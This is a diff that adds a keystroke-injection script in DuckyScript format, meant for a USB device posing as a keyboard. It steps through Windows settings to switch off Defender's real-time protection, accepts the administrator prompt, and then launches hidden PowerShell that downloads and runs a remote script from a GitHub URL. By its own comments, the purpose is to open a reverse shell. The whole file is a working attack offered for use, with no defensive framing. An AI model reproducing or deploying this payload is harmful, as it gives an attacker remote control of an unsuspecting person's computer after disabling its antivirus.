@@ -1,0 +1,56 @@
+REM Turn off Real-time protection and start reverse shell
+DELAY 1000
+GUI i 
+DELAY 500
+TAB
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+ENTER
+DELAY 1000
+TAB 
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 1000
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 1000
+SPACE
+REM if you need administrator [delay 500 and alt y]
+DELAY 500
+ALT y
+DELAY 1000
+ALT F4
+DELAY 500
+ALT F4
+DELAY 500
+REM execute powershell command to start reverse shell script [don't forget to change IP]
+GUI r 
+DELAY 300
+STRING powershell -w hidden "powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/hiddensquid81/FreeNode234/refs/heads/main/test -usebasicparsing)"
+DELAY 300
+ENTER
+DELAY 200
